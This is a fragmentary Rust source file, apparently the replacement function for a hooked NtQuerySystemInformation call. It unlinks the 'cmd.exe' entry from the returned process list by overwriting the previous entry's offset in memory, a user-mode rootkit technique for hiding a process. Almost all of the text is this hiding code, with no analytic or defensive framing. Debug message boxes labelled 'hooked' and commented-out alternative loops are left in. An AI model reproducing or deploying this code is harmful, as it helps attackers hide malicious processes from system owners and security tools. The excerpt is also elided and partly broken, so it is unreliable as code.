...
#[no_mangle]
pub unsafe extern "C" fn test2(sysinfo: u32,
    ...
    outinfolength: *mut u32) -> i32{
       ...
       // return NtQuerySystemInformation(sysinfo , baseaddress, infolength, outinfolength);
        ...
        let runner =std::mem::transmute::<*mut c_void,
            fn(u32, *mut c_void,u32,*mut u32)->i32
        >(originaladdress as *mut c_void);


           let res= runner(sysinfo , baseaddress, infolength, outinfolength);


           let mut processes:Vec<SYSTEM_PROCESS_INFORMATION> =Vec::new();

            
            let mut originalbase = baseaddress.clone();
           // let mut previousaddress = baseaddress.clone();
            //let mut currentaddress = baseaddress.clone();

            let mut temp:[u8;size_of::<SYSTEM_PROCESS_INFORMATION>()] = [0;size_of::<SYSTEM_PROCESS_INFORMATION>()];

            //let mut nextaddress:*mut c_void = previousaddress;


            
        let mut spi= SYSTEM_PROCESS_INFORMATION::default();
        ...
        while true{
            ...
            let mut previousaddress = originalbase;
            let mut nextaddress =originalbase as isize + spi.NextEntryOffset as isize;

            FillStructureFromMemory(&mut spi,nextaddress as *const c_void,GetCurrentProcess());



            let mut v1:Vec<u16> = vec![0;spi.ImageName.Length as usize];
            ReadProcessMemory(GetCurrentProcess(), 
            spi.ImageName.Buffer.0 as *const c_void, 
            v1.as_mut_ptr() as *mut c_void, 
            spi.ImageName.Length  as usize, std::ptr::null_mut());


            let procname = String::from_utf16_lossy(&v1);


            if procname.trim_end_matches('\0')=="cmd.exe"{
                
                /*MessageBoxA(std::ptr::null_mut(),
        "yes notepad.exe\0".as_ptr() as *const i8,
        "hooked\0".as_ptr() as *const i8,0   );

                let temp2 = processes.pop().unwrap();
                let mut finaloffset = temp2.NextEntryOffset + spi.NextEntryOffset;
*/
                let mut prevoffset:[u8;4] = [0;4];

                ReadProcessMemory(GetCurrentProcess(), 
                previousaddress, 
                prevoffset.as_mut_ptr() as *mut c_void, 4, std::ptr::null_mut());


                let mut finaloffset = u32::from_ne_bytes(prevoffset) + spi.NextEntryOffset as u32;


                VirtualProtectEx(GetCurrentProcess(), 
                originalbase, 4, 0x40, std::ptr::null_mut());

                 WriteProcessMemory(GetCurrentProcess(),
                 originalbase, 
                 finaloffset.to_ne_bytes().as_ptr() as *const c_void,
                 4, std::ptr::null_mut());
                break;
            ...
            originalbase = nextaddress as *mut c_void;
            processes.push(spi.clone());
            ...
            /*while true{
                ...
                FillStructureFromMemory(&mut spi, nextaddress, GetCurrentProcess());

                if spi.NextEntryOffset == 0{

                    /*MessageBoxA(std::ptr::null_mut(),
        processes.len().to_string().as_ptr() as *const i8,
        "hooked\0".as_ptr() as *const i8,0   );*/
                    break;
                }
                ...
                let mut namearray:Vec<u16> = vec![0;spi.ImageName.Length as usize];
                ReadProcessMemory(prochandle1, 
                    spi.ImageName.Buffer.0 as *const c_void, 
                    namearray.as_mut_ptr() as *mut c_void,
                            spi.ImageName.Length as usize, std::ptr::null_mut());
                let mut processname = String::from_utf16_lossy(&namearray);
                    //processname.push('\0');


                     if processname.trim_end_matches('\0').contains("notepad.exe"){
                        //processname.push('\0');
                        MessageBoxA(std::ptr::null_mut(),
        "yes notepad\0".as_ptr() as *const i8,
        "hooked\0".as_ptr() as *const i8,0   );
                    }
                ...
                previousaddress = nextaddress.clone();
                nextaddress= (nextaddress as isize + spi.NextEntryOffset as isize) as *mut c_void;

            /*while true{


                ReadProcessMemory(prochandle1, 
            nextaddress as *const c_void, temp.as_mut_ptr() as *mut c_void,
                    temp.len(), std::ptr::null_mut());
        
                    FillStructureFromArray(&mut spi, &temp);
                    ...
                    ReadProcessMemory(prochandle1, 
                        spi.ImageName.Buffer.0 as *const c_void, 
                        namearray.as_mut_ptr() as *mut c_void,
                                namearray.len(), std::ptr::null_mut());
                    let mut processname = String::from_utf16_lossy(&namearray[..]);
                        //processname.push('\0');
                    ...
                    if processname.trim_end_matches('\0').contains("notepad.exe"){
                            ...
                            if spi.NextEntryOffset ==0{
                                let mut diffoffset:i32 = 0;
                                /*WriteProcessMemory(prochandle1,
                                    previousaddress , 
                                    diffoffset.to_ne_bytes().as_ptr() as *const c_void,
                                    4, std::ptr::null_mut());
                                    break;*/

                            }

                            let mut nextbase = nextaddress + spi.NextEntryOffset as isize;
                            let mut diffoffset = nextbase - previousaddress as isize;
                    ...
                    previousaddress = nextaddress as *mut c_void;
                    nextaddress = nextaddress + spi.NextEntryOffset as isize;
